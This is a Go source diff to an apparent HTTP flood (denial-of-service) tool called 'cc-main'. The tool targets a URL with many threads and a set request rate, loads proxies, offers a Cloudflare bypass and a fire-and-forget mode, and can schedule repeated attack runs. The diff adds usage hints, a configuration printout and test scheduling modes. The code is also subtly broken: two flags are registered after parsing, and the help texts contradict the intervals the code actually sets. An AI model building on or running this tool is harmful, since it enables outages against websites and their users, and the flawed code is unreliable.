@@ -75,6 +75,15 @@ func main() {
 
 	// 解析命令行参数
 	config := parseArgs()
+	
+	// 显示使用帮助
+	fmt.Printf("\n💡 使用提示:\n")
+	fmt.Printf("  - 普通模式: ./cc-main -url https://example.com\n")
+	fmt.Printf("  - 定时任务: ./cc-main -url https://example.com -schedule -schedule-interval 10 -schedule-duration 5\n")
+	fmt.Printf("  - 测试模式: ./cc-main -url https://example.com -test-schedule\n")
+	fmt.Printf("  - 立即执行: ./cc-main -url https://example.com -immediate\n")
+	fmt.Printf("  - 快速测试: ./cc-main -url https://example.com -quick-test\n")
+	fmt.Printf("\n")
 
 	// 加载代理
 	loadProxies(config.ProxyFile)
@@ -83,10 +92,28 @@ func main() {
 	// 启动统计协程
 	go statsReporter()
 
+	// 显示最终配置
+	fmt.Printf("\n📋 最终配置:\n")
+	fmt.Printf("  URL: %s\n", config.TargetURL)
+	fmt.Printf("  模式: %s\n", config.Mode)
+	fmt.Printf("  线程数: %d\n", config.Threads)
+	fmt.Printf("  RPS: %d\n", config.RPS)
+	fmt.Printf("  持续时间: %d秒\n", config.Duration)
+	fmt.Printf("  定时任务: %t\n", config.Schedule)
+	if config.Schedule {
+		fmt.Printf("  定时间隔: %d分钟\n", config.ScheduleInterval)
+		fmt.Printf("  执行时长: %d分钟\n", config.ScheduleDuration)
+	}
+	fmt.Printf("  CF绕过: %t\n", config.CFBypass)
+	fmt.Printf("  火后不理: %t\n", config.FireAndForget)
+	fmt.Printf("\n")
+
 	// 启动攻击
 	if config.Schedule {
+		fmt.Printf("🕐 定时任务模式已启用\n")
 		startScheduledAttack(config)
 	} else {
+		fmt.Printf("🚀 立即执行模式\n")
 		startAttack(config)
 	}
 }
@@ -121,9 +148,43 @@ func parseArgs() *Config {
 	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
 	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
 	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
+	
+	// 测试模式：短间隔定时任务
+	var testMode bool
+	flag.BoolVar(&testMode, "test-schedule", false, "测试模式：每30秒执行一次，每次10秒")
 	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
 	flag.BoolVar(&config.FireAndForget, "fire-and-forget", config.FireAndForget, "火后不理模式，不接收响应数据，极速模式")
 	flag.Parse()
+
+	// 测试模式配置
+	if testMode {
+		fmt.Printf("🧪 测试模式已启用\n")
+		config.Schedule = true
+		config.ScheduleInterval = 1 // 1分钟间隔
+		config.ScheduleDuration = 1 // 1分钟执行
+		fmt.Printf("📝 测试配置: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
+	}
+	
+	// 添加快速测试模式
+	var quickTest bool
+	flag.BoolVar(&quickTest, "quick-test", false, "快速测试：每10秒执行一次，每次5秒")
+	if quickTest {
+		fmt.Printf("⚡ 快速测试模式已启用\n")
+		config.Schedule = true
+		config.ScheduleInterval = 1 // 1分钟间隔（最小）
+		config.ScheduleDuration = 1 // 1分钟执行（最小）
+		fmt.Printf("📝 快速测试配置: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
+	}
+	
+	// 添加立即执行选项
+	var immediate bool
+	flag.BoolVar(&immediate, "immediate", false, "立即执行一次攻击（用于测试）")
+	if immediate {
+		fmt.Printf("⚡ 立即执行模式已启用\n")
+		config.Schedule = false
+		config.Duration = 10 // 10秒测试
+		fmt.Printf("📝 立即执行配置: 持续%d秒\n", config.Duration)
+	}
 
 	// 基本校验
 	if strings.TrimSpace(config.TargetURL) == "" {
@@ -205,7 +266,11 @@ func startScheduledAttack(config *Config) {
 	fmt.Printf("🕐 启动定时攻击模式: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
 	fmt.Printf("📅 下次执行时间: %s\n", time.Now().Add(time.Duration(config.ScheduleInterval)*time.Minute).Format("2006-01-02 15:04:05"))
 	
-	ticker := time.NewTicker(time.Duration(config.ScheduleInterval) * time.Minute)
+	// 创建定时器
+	interval := time.Duration(config.ScheduleInterval) * time.Minute
+	fmt.Printf("⏰ 定时器间隔: %v\n", interval)
+	
+	ticker := time.NewTicker(interval)
 	defer ticker.Stop()
 
 	// 先等待第一次定时器触发
